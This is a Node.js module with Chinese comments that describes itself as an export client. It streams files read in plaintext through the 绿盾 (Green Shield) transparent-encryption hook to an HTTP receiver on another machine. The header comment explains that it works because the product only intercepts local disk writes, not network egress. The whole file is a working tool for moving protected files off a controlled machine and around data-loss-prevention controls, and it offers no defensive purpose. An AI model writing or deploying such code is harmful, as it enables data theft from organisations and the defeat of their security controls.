'use strict';

// 网络导出客户端：把“明文”通过 HTTP 推送到“不受绿盾保护的接收端”。
// 绿盾透明加密只拦截“本机磁盘写入”，不拦截网络出口，因此该通道可把明文送出受控机器，
// 在另一台机器上以明文落盘。
//
// 推送协议：POST <baseUrl>/upload
//   body            : 原始文件字节（可由 Buffer 或可读流提供）
//   头 X-Filename   : encodeURIComponent(文件名)
//   头 X-Relpath    : encodeURIComponent(相对路径，可含子目录，如 a/b.txt)
//   头 Authorization: Bearer <token>   （可选，接收端启用 TOKEN 时必填）
//
// 零第三方依赖，仅使用 Node 内置 http/https。

const http = require('http');
const https = require('https');
const { URL } = require('url');

function buildUrl(baseUrl) {
  let u;
  try {
    u = new URL(baseUrl);
  } catch (e) {
    throw new Error('导出地址格式错误: ' + baseUrl);
  }
  if (!u.pathname.endsWith('/upload')) {
    const sep = u.pathname.endsWith('/') ? '' : '/';
    u.pathname = u.pathname + sep + 'upload';
  }
  return u;
}

// 把单个 Buffer 推送到接收端
function exportBuffer(baseUrl, token, filename, relpath, buffer) {
  return new Promise((resolve, reject) => {
    let url;
    try { url = buildUrl(baseUrl); } catch (e) { return reject(e); }
    const lib = url.protocol === 'https:' ? https : http;
    const data = Buffer.isBuffer(buffer) ? buffer : Buffer.from(buffer);
    const headers = {
      'Content-Type': 'application/octet-stream',
      'Content-Length': data.length,
      'X-Filename': encodeURIComponent(filename || 'file.bin'),
      'X-Relpath': encodeURIComponent(relpath || filename || 'file.bin')
    };
    if (token) headers['Authorization'] = 'Bearer ' + token;

    const req = lib.request(url, { method: 'POST', headers }, (res) => {
      let body = '';
      res.on('data', (c) => { body += c; });
      res.on('end', () => {
        if (res.statusCode >= 200 && res.statusCode < 300) resolve({ ok: true, status: res.statusCode });
        else reject(new Error('导出失败 HTTP ' + res.statusCode + ': ' + body));
      });
    });
    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

// 把可读流（如源文件的读流，绿盾读钩子会在此返回明文）直接流式推送，不落本机磁盘、不占内存
function exportStream(baseUrl, token, filename, relpath, readStream) {
  return new Promise((resolve, reject) => {
    let url;
    try { url = buildUrl(baseUrl); } catch (e) { return reject(e); }
    const lib = url.protocol === 'https:' ? https : http;
    const headers = {
      'Content-Type': 'application/octet-stream',
      'X-Filename': encodeURIComponent(filename || 'file.bin'),
      'X-Relpath': encodeURIComponent(relpath || filename || 'file.bin')
    };
    if (token) headers['Authorization'] = 'Bearer ' + token;

    const req = lib.request(url, { method: 'POST', headers }, (res) => {
      let body = '';
      res.on('data', (c) => { body += c; });
      res.on('end', () => {
        if (res.statusCode >= 200 && res.statusCode < 300) resolve({ ok: true, status: res.statusCode });
        else reject(new Error('导出失败 HTTP ' + res.statusCode + ': ' + body));
      });
    });
    req.on('error', reject);
    readStream.on('error', reject);
    readStream.pipe(req); // 流式转发：源读流 -> 网络请求体（chunked 传输）
  });
}

module.exports = { exportBuffer, exportStream, buildUrl };
